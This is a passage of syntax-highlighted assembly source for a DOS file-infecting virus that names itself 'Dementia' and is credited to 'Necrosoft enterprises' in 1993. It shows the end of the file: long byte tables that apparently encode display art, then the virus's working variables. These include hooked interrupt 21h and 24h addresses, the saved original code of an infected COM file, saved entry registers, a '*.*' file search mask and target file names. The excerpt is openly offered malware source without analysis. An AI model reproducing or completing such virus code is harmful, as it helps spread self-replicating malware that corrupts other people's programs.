         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0dch</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0deh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc2">0ddh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc4">,</span><span class="sc2">0eeh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">46h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">05</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0a0h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0bah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0bch</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0dah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0b9h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0dch</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2ch</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc4">,</span><span class="sc2">0aeh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0e6h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc4">,</span><span class="sc2">0b6h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc2">5dh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">0ach</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0deh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">85h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0dch</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0a6h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0dbh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc4">,</span><span class="sc2">0a2h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2dh</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">54h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0fah</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">64h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">56h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">2dh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">87h</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0dch</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">39h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc4">,</span><span class="sc2">0a3h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">38h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">7eh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">91h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">6eh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">52h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">44h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">6ch</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">2eh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">38h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc4">,</span><span class="sc2">0a3h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0d2h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">8eh</span><span class="sc4">,</span><span class="sc2">0a4h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">22h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">2dh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">5ch</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc2">2dh</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">50h</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc2">79h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">63h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">6fh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc4">,</span><span class="sc2">6dh</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">61h</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc2">6bh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
</span><span class="sc5">ansi_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">file_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">temp_file</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'!#TEMP#!'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Temporary file</span><span class="sc0">
</span><span class="sc5">request_iva</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'REQUEST.IVA'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">   </span><span class="sc1">; REQUEST.IVA</span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RECEIPT.IVA '</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; Filename</span><span class="sc0">
</span><span class="sc5">receipt_iva</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'RECEIPT.IVA '</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; RECEIPT.IVA</span><span class="sc0">
</span><span class="sc5">callfast_com</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CALLFAST.COM'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; CALLFAST.COM</span><span class="sc0">
</span><span class="sc5">file_specifi</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.*'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">           </span><span class="sc1">; File specification</span><span class="sc0">
</span><span class="sc5">origin_code</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">      </span><span class="sc1">; Original code of infected COM file</span><span class="sc0">
</span><span class="sc5">int21_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 21h</span><span class="sc0">
</span><span class="sc5">int24_addr</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Address of interrupt 24h</span><span class="sc0">
</span><span class="sc5">com_or_exe</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; COM or EXE executable</span><span class="sc0">
</span><span class="sc5">stack_ptr</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Original stack pointer</span><span class="sc0">
</span><span class="sc5">stack_seg</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Original stack segment</span><span class="sc0">
</span><span class="sc5">instruct_ptr</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Original instruction pointer</span><span class="sc0">
</span><span class="sc5">code_seg</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Original code segment</span><span class="sc0">
</span><span class="sc5">initial_ip</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Initial IP</span><span class="sc0">
</span><span class="sc5">initial_cs</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Initial CS relative to start of ...</span><span class="sc0">
</span><span class="sc5">code_seg_</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Code segment</span><span class="sc0">
</span><span class="sc5">tst_filesize</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; Test or don't test filesize</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Dementia]'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Copyright 1993 Necrosoft enterprises  -  All rights reserved'</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
